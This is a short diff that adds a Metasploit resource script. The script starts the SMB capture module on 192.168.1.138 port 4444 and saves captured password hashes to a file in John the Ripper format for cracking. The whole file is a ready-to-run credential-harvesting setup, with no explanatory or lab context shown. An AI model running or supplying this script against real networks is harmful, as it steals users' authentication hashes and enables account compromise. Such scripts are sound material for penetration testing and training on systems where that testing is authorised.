@@ -1,0 +1,6 @@
+
+use auxiliary/server/capture/smb
+set SRVHOST 192.168.1.138
+set SRVPORT 4444
+set JOHNPWFILE passwords
+run
